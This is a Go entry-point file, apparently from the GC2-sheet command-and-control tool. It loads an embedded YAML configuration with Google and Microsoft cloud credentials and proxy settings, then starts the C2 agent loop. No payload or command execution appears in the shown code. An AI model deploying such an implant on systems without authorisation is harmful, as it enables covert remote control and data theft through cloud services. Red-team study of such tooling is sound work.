package cmd

import (
	"GC2-sheet/internal/C2"
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	_ "embed"
	"log"
	"net/url"

	"gopkg.in/yaml.v2"
)

var (
	//go:embed options.yml
	configurationFileContent []byte
)

type ConfigurationFile struct {
	CommandService          string `yaml:"CommandService"`
	FileSystemService       string `yaml:"FileSystemService"`
	GoogleServiceAccountKey string `yaml:"GoogleServiceAccountKey"`
	GoogleSheetID           string `yaml:"GoogleSheetID"`
	GoogleDriveID           string `yaml:"GoogleDriveID"`
	MicrosoftTenantID       string `yaml:"MicrosoftTenantID"`
	MicrosoftClientID       string `yaml:"MicrosoftClientID"`
	MicrosoftClientSecret   string `yaml:"MicrosoftClientSecret"`
	MicrosoftSiteID         string `yaml:"MicrosoftSiteID"`
	RowId                   int    `yaml:"RowId"`
	Proxy                   string `yaml:"Proxy"`
	Verbose                 bool   `yaml:"Verbose"`
}

func Execute() {

	configurationFile := ConfigurationFile{
		CommandService:        configuration.Google.String(),
		FileSystemService:     configuration.Google.String(),
		MicrosoftTenantID:     "",
		MicrosoftClientID:     "",
		MicrosoftClientSecret: "",
		MicrosoftSiteID:       "",
		RowId:                 1,
		Proxy:                 "",
		Verbose:               false,
	}

	yaml.Unmarshal(configurationFileContent, &configurationFile)

	proxyUrl, err := url.Parse(configurationFile.Proxy)

	if err != nil {
		utils.LogFatalDebug("Proxy string invalid")
	}

	if configurationFile.Proxy == "" {
		proxyUrl = nil
	}

	if (configurationFile.CommandService != configuration.Microsoft.String() && configurationFile.CommandService != configuration.Google.String()) || (configurationFile.FileSystemService != configuration.Microsoft.String() && configurationFile.FileSystemService != configuration.Google.String()) {
		log.Fatal("CommandService and FileSystemService can be only Google or Microsoft (combination is possible)")
	}

	configuration.SetOptions(configurationFile.CommandService, configurationFile.FileSystemService, configurationFile.GoogleServiceAccountKey, configurationFile.GoogleSheetID, configurationFile.GoogleDriveID, configurationFile.MicrosoftTenantID, configurationFile.MicrosoftClientID, configurationFile.MicrosoftClientSecret, configurationFile.MicrosoftSiteID, configurationFile.RowId, proxyUrl, configurationFile.Verbose)

	utils.LogDebug("Using configuration file")

	C2.Run()
}
